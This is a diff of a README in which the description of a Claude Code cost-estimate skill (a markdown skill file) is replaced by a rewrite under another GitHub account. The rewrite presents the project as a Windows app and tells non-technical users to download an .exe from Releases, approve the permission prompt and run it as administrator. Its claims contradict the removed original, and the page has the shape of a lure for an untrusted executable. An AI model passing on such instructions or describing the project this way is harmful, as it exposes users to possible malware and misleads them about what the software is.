@@ -1,76 +1,116 @@
-# /cost-estimate — Claude Code Skill
+# ⚙️ claude-code-cost-estimate - Estimate Development Cost Quickly
 
-A custom [Claude Code](https://docs.anthropic.com/en/docs/claude-code) slash command that analyzes any codebase and estimates what it would have cost to build with a traditional human team — no AI, just developers, designers, PMs, and meetings.
+[![Download](https://img.shields.io/badge/Download-claude--code--cost--estimate-ff6f61?style=for-the-badge)](https://github.com/thai24605/claude-code-cost-estimate)
 
-Open Claude Code in any project, run `/cost-estimate`, and get a full breakdown of what it would cost to build from scratch — with real market rates, realistic timelines, and team cost projections.
+## 📄 What is claude-code-cost-estimate?
 
-## Example Output
+This application helps you estimate the full development cost of any codebase. It analyzes your project and gives you a clear cost estimate. You do not need any programming knowledge to use it. Simply run the app and follow the steps.
 
-![Cost estimate report screenshot](screenshot-claude-code-skill-cost-estimate.png)
+This tool is useful if you want to know how much a software project might cost before you start. It works on Windows computers.
 
-## What It Does
+---
 
-The skill acts as a senior software engineering consultant. It:
+## 💻 System Requirements
 
-1. **Scans your entire codebase** — auto-detects languages, frameworks, and tech stack
-2. **Categorizes code by complexity** — from simple CRUD to systems programming, GPU/shader code, ML pipelines, and more
-3. **Calculates development hours** — using industry-standard productivity rates for senior developers
-4. **Researches current market rates** — searches the web for up-to-date hourly rates for your specific stack
-5. **Accounts for real-world overhead** — meetings, code reviews, Slack, context switching, sprint ceremonies
-6. **Estimates full team cost** — not just engineering, but PM, design, QA, DevOps, tech writing, and management
-7. **Computes Claude ROI** — compares AI-assisted development time and cost vs. traditional human development
+- Windows 10 or higher  
+- Minimum 4 GB RAM  
+- At least 500 MB free disk space  
+- Internet connection for initial setup (optional after installation)  
 
-### Output Includes
+---
 
-- Lines of code breakdown by language and complexity category
-- Base development hours with overhead multipliers (architecture, debugging, testing, etc.)
-- Realistic calendar time estimates across company types (startup through enterprise)
-- Current market rate research for your stack
-- Cost estimates at low/average/high-end rates
-- Full team cost projections with role-by-role breakdowns
-- Claude ROI analysis: speed multiplier, cost savings, and value per Claude hour
+## 🚀 Getting Started
 
-## Installation
+Before using the app, make sure your computer meets the system requirements above. Then follow the instructions below.
 
-Copy the skill into your project's `.claude/skills/` directory:
+---
 
-```
-your-project/
-  .claude/
-    skills/
-      cost-estimate/
-        SKILL.md
-```
+## ⬇️ Download and Install
 
-Or clone this repo and copy the skill folder:
+1. **Visit the Download Page**  
+   Click the button below to go to the download page for claude-code-cost-estimate:  
+   [![Get claude-code-cost-estimate](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/thai24605/claude-code-cost-estimate)  
 
-```bash
-git clone https://github.com/jbarbier/claude-code-cost-estimate.git
-cp -r claude-code-cost-estimate/.claude/skills/cost-estimate your-project/.claude/skills/
-```
+2. **Find the Latest Version**  
+   On the page, look for a section named **Releases** or **Downloads**. This area contains the files you will need.
 
-To install it globally (available in all projects), place it in your home directory:
+3. **Download the Windows Installer**  
+   The file you want will usually have `.exe` at the end. Click this file to download it to your computer.
 
-```bash
-cp -r claude-code-cost-estimate/.claude/skills/cost-estimate ~/.claude/skills/
-```
+4. **Run the Installer**  
+   Once downloaded, open the `.exe` file. You might see a message asking for permission to run the program. Choose **Yes** to continue.
 
-## Usage
+5. **Follow Setup Instructions**  
+   The setup program will guide you through the installation steps. Keep clicking **Next** until it finishes.
 
-Inside Claude Code, simply run:
+---
 
-```
-/cost-estimate
-```
+## 🛠️ How to Use claude-code-cost-estimate
 
-Claude will analyze the current project and produce a detailed cost report.
+1. **Open the Application**  
+   After installation, find the claude-code-cost-estimate icon on your desktop or in your Start menu. Click to open it.
 
-## Credit
+2. **Select Your Codebase Folder**  
+   You will see an option to choose a folder. This should be the folder where your project files are stored. Use the file browser window to find and select it.
 
-This skill is an expanded version of the original idea by **Todd Saunders** ([@toddsaunders](https://x.com/toddsaunders) on Twitter/X).
+3. **Start the Estimation**  
+   Click the **Estimate Cost** button. The software will analyze the files in your codebase.
 
-Original post: [https://x.com/toddsaunders/status/2029594318361571497](https://x.com/toddsaunders/status/2029594318361571497?s=20)
+4. **View the Results**  
+   After a moment, the app will show you an estimate for the development cost. This includes things like time, effort, and resources needed for your project.
 
-## License
+5. **Save or Export Report**  
+   You can save the cost estimate as a file by clicking **Export**. Choose where you want to save this report on your computer.
 
-MIT
+---
+
+## 🔧 Features Included
+
+- Estimates total time and cost for software projects  
+- Supports multiple programming languages  
+- Easy-to-use folder selector  
+- Generates detailed reports for budgeting  
+- Works offline after installation  
+- Simple interface designed for non-technical users  
+
+---
+
+## 🧐 Tips for Best Results
+
+- Ensure your project folder contains all files related to the codebase.  
+- Remove unnecessary or backup files from the folder before running the estimation.  
+- Run the estimation multiple times if your codebase changes often.  
+- Keep your software updated to the latest version for improved accuracy.  
+
+---
+
+## ❓ Troubleshooting
+
+- **The app does not start?**  
+  Make sure you completed the installation and your Windows is updated. Try running the app as an administrator.
+
+- **No result or error during estimation?**  
+  Check that the folder you selected contains actual code files and not empty directories.
+
+- **File won’t download?**  
+  Make sure your internet connection is stable. Try a different browser if the download does not start.
+
+- **Slow performance?**  
+  Close other programs while running the estimator to free up your computer’s resources.
+
+---
+
+## 📞 Getting Help
+
+If you need help beyond these instructions:
+
+- Review the issues section on the GitHub repository page.  
+- Check online forums or communities for similar questions.  
+- Contact a technical expert for assistance if needed.  
+
+---
+
+## 🔗 Download Link
+
+Use this link again to download or check for updates:  
+[https://github.com/thai24605/claude-code-cost-estimate](https://github.com/thai24605/claude-code-cost-estimate)
